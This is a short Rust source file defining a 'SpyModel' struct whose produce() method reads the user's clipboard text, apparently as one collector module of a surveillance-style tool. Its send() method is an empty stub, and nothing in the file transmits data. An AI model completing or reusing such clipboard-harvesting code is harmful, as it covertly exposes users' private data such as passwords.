use serde::{Serialize, Deserialize};
use super::producer::Producer;
use arboard::Clipboard;

#[derive(Debug, Serialize, Deserialize)]
struct SpyModel {
    clipboard: String
}

#[typetag::serde]
impl Producer for SpyModel {
    fn produce() -> Box<dyn Producer> {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Box::new(Self { clipboard: text })
    }
    fn send(&self) {
        ()
    } 
}

impl SpyModel {
    
}